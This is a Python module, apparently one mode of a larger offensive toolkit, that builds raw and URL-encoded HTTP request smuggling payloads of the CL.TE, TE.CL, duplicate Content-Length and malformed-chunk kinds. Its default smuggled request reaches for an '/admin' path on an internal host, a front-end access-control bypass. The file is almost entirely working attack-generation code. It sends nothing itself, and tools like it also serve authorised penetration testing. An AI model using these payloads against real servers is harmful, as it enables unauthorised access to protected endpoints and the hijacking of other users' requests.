"""
smuggling_mode.py
Generates HTTP request smuggling payloads.

Supports:
- CL.TE (Content-Length then Transfer-Encoding)
- TE.CL (Transfer-Encoding then Content-Length)
- Dual Content-Length
- Chunked body manipulation
- Proxy bypass SSRF vectors

This module does NOT send the payload anywhere.
It only generates and returns encoded payloads.
"""

import urllib.parse

MODE_NAME = "smuggling_mode"


def encode(data: str) -> str:
    """URL-encode payloads for safe injection."""
    return urllib.parse.quote(data, safe='')


def build_cl_te(host, inner_request):
    """
    Content-Length followed by Transfer-Encoding: chunked.
    Classic CL.TE smuggling.
    """
    body = f"0\r\n\r\n{inner_request}"
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    )


def build_te_cl(host, inner_request):
    """
    Transfer-Encoding: chunked followed by Content-Length.
    Classic TE.CL smuggling.
    """
    chunk = f"{len(inner_request):X}\r\n{inner_request}\r\n0\r\n\r\n"
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 9999\r\n"
        f"\r\n"
        f"{chunk}"
    )


def build_dual_cl(host, inner_request):
    """
    Two Content-Length headers with conflicting values.
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(inner_request)}\r\n"
        f"Content-Length: 9999\r\n"
        f"\r\n"
        f"{inner_request}"
    )


def build_chunked_override(host, inner_request):
    """
    Malformed chunked body to confuse proxies.
    """
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"5\r\nHELLO\r\n"
        f"0\r\n\r\n"
        f"{inner_request}"
    )


def run(target, options):
    """
    Generate HTTP request smuggling payloads.

    Parameters:
        target (str): Hostname for Host header.
        options (dict):
            - inner_request: raw HTTP request to smuggle
            - type: cl_te, te_cl, dual_cl, chunked_override

    Returns:
        dict: Raw + encoded payloads.
    """

    host = target or "localhost"
    inner = options.get("inner_request", "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n")
    smuggle_type = options.get("type", "cl_te")

    result = {
        "mode": MODE_NAME,
        "target": host,
        "type": smuggle_type,
        "inner_request": inner,
        "raw": None,
        "encoded": None
    }

    if smuggle_type == "cl_te":
        raw = build_cl_te(host, inner)
    elif smuggle_type == "te_cl":
        raw = build_te_cl(host, inner)
    elif smuggle_type == "dual_cl":
        raw = build_dual_cl(host, inner)
    elif smuggle_type == "chunked_override":
        raw = build_chunked_override(host, inner)
    else:
        return {
            "mode": MODE_NAME,
            "error": f"Unknown smuggling type: {smuggle_type}"
        }

    result["raw"] = raw
    result["encoded"] = encode(raw)
    return result
